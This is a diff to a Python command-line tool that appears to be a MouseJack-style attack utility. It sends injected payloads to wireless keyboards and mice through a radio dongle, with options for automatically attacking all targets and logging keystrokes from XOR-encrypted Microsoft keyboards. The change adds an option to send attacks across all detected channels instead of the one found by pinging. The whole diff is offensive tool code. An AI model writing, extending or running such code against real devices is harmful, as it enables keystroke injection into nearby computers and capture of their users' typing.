@@ -28,7 +28,7 @@ C = '\033[36m'  # cyan
 GR = '\033[37m'  # gray
 
 
-def launch_attacks(jack, targets, attack):
+def launch_attacks(jack, targets, attack, use_ping=True):
     for addr_string, target in targets.iteritems():
         payload  = target['payload']
         channels = target['channels']
@@ -40,7 +40,10 @@ def launch_attacks(jack, targets, attack):
 
         if hid:
             # Attempt to ping the devices to find the current channel
-            lock_channel = jack.find_channel(address)
+            if use_ping:
+                lock_channel = jack.find_channel(address)
+            else:
+                lock_channel = False
 
             if lock_channel:
                 print(GR + '[+] ' + W + 'Ping success on channel %d' % (lock_channel,))
@@ -126,8 +129,9 @@ def confirm_root():
 @click.option('--vendor', default="", help="Vendor of device to target (required when specifying address)")
 @click.option('--reset', is_flag=True, help="Reset CrazyPA dongle prior to initalization")
 @click.option('--autopwn', is_flag=True, help="Automatically find and attack all targets")
+@click.option('--all-channels', is_flag=True, help="Send attack to all detected channels")
 @click.option('--keylogging', is_flag=True, help="Log keystrokes for XOR encrypted MS keyboards")
-def cli(debug, script, lowpower, interval, layout, address, vendor, reset, autopwn, keylogging):
+def cli(debug, script, lowpower, interval, layout, address, vendor, reset, autopwn, all_channels, keylogging):
 
     banner()
     confirm_root()
@@ -232,7 +236,7 @@ def cli(debug, script, lowpower, interval, layout, address, vendor, reset, autop
                 if device['index'] in target_list:
                     targets[addr_string] = device
 
-        launch_attacks(jack, targets, attack)
+        launch_attacks(jack, targets, attack, (not all_channels))
 
         print(GR + '\n[+] ' + W + "All attacks completed\n")
 
